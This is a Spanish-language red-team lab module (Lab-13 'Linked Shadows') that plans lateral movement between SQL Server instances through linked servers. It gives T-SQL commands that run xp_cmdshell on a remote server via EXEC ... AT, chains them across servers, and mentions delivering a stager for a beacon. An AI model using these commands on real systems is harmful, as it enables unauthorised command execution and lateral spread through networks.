# Módulo M5 · Lateral vía linked servers (Cloud Hopper SQL) — Lab-13 LINKED SHADOWS

> **Módulo M5 · Ruta: `[si hay linked servers]`**
>
> **Objetivo único:** Saltar a un servidor remoto a través del linked server: ejecutar xp_cmdshell en SQL-B desde SQL-A, obteniendo beacon en el servidor remoto.
>
> **Prerequisito real:** M4 (foothold en SQL-A con sysadmin) + linked server confirmado en M2.
>
> **Habilita:** beacon en SQL-B o más allá — lateral a un segmento diferente siguiendo la cadena SQL.
>
> **TTP:** T1210 · T1550

## Plan de ejecución

`EXEC ('xp_cmdshell ''whoami''') AT [SQL-B]` · stager vía AT. Cadena de saltos: `EXEC ('EXEC (''...'') AT [SQL-C]') AT [SQL-B]`.

## Operativa real (completar al ejecutar)

> ⚠ Arquetipo operación: este módulo es el PLAN. Captura aquí la ejecución real — comandos, salidas, capturas, la cuenta de servicio SQL obtenida.

---

*Módulo M5 · Lab-13 Linked Shadows · Cloud Hopper SQL (anatomía v3.1, arquetipo operación)*
